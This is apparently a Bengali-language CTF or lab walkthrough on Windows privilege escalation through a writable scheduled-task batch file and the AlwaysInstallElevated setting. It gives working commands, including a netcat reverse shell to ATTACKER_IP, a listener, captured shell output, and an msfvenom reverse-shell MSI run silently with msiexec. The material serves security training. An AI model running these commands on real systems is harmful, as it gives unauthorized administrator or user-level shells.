## Other Quick Wins

কিছু misconfiguration ব্যবহার করে সহজেই higher privilege বা Administrator access পাওয়া যায়। এগুলো real penetration testing-এর চেয়ে CTF-এ বেশি দেখা যায়। আগের পদ্ধতিগুলো কাজ না করলে এগুলো পরীক্ষা করা যায়।

### 1. Scheduled Tasks

Scheduled Task-এর executable missing বা modify করার permission থাকলে privilege escalation সম্ভব।

Task information:

```
schtasks
schtasks /query /tn vulntask /fo list /v
```

Output:

```
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

- Task To Run: যে file execute হবে।
- Run As User: যে user-এর privilege-এ task চলবে।

`icacls` দিয়ে file permission check:

```
icacls c:\tasks\schtask.bat
```

Output:

```
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

`BUILTIN\Users`-এর Full access (F) আছে, তাই `.bat` file modify করা যাবে।

Reverse shell payload:

```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Attacker machine-এ listener:

```
nc -lvp 4444
```

Task manually run:

```
schtasks /run /tn vulntask
```

Reverse shell পাওয়া যাবে `taskusr1` privilege-এ।

Output:

```
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```

`taskusr1`-এর Desktop থেকে flag নিতে হবে এবং task শেষে submit করতে হবে।

### 2. AlwaysInstallElevated

Windows Installer (`.msi`) সাধারণত যে user চালায় তার privilege-এ চলে। কিন্তু AlwaysInstallElevated enabled থাকলে unprivileged user-ও Administrator privilege-এ MSI চালাতে পারে।

Note: এই room-এর machine-এ methodটি কাজ করবে না; শুধু information হিসেবে দেওয়া হয়েছে।

দুটি Registry value check করতে হবে:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

দুটিই set থাকতে হবে, অন্যথায় exploit সম্ভব নয়।

Malicious MSI তৈরি:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Reverse shell হওয়ায় একই configuration অনুযায়ী Metasploit Handler চালাতে হবে।

Target machine-এ MSI transfer করে execute:

```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

এতে Administrator privilege-এ reverse shell পাওয়া সম্ভব।
